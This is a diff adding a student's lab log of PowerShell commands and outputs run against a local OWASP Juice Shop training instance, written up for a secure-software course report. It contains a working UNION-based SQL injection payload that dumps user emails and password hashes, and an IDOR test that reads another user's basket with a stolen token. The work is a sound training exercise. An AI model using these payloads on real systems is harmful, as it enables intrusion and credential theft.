@@ -1,0 +1,46 @@
+# Lab 6 — terminal outputs (127.0.0.1:3000, bkimminich/juice-shop)
+# Date: 2026-05-20
+# Copy into report_6.md as ```text blocks (no screenshots required)
+
+## === SQL Injection ===
+
+PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=apple"
+{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...}]}
+
+PS> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=';"
+<html>...<title>Error: SQLITE_ERROR: near ";": syntax error</title>...
+<h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+
+PS> curl.exe -s -o NUL -w "%{http_code}" "http://127.0.0.1:3000/rest/products/search?q=';"
+500
+
+PS> $payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
+PS> $enc = [uri]::EscapeDataString($payload)
+PS> $r = curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc" | ConvertFrom-Json
+PS> $r.data | Where-Object { $_.name -eq '2' } | Format-Table id, price, deluxePrice
+
+id price                      deluxePrice
+-- -----                      -----------
+ 1 admin@juice-sh.op          0192023a7bbd73250516f069df18b500
+ 2 jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
+ 3 bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
+ 4 bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
+ 5 ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
+ 6 support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
+
+## === BOLA (IDOR basket) ===
+
+PS> $loginJson = curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' | ConvertFrom-Json
+PS> $token = $loginJson.authentication.token
+bid=2 umail=jim@juice-sh.op
+
+PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1 -H "Authorization: Bearer $token"
+{"status":"success","data":{"id":1,"UserId":1,"Products":[Apple x2, Orange x3, Eggfruit x1]}}
+HTTP:200
+
+PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/2 -H "Authorization: Bearer $token"
+{"status":"success","data":{"id":2,"UserId":2,"Products":[Raspberry x2]}}
+HTTP:200
+
+PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1
+HTTP:401 UnauthorizedError: Format is Authorization: Bearer [token]
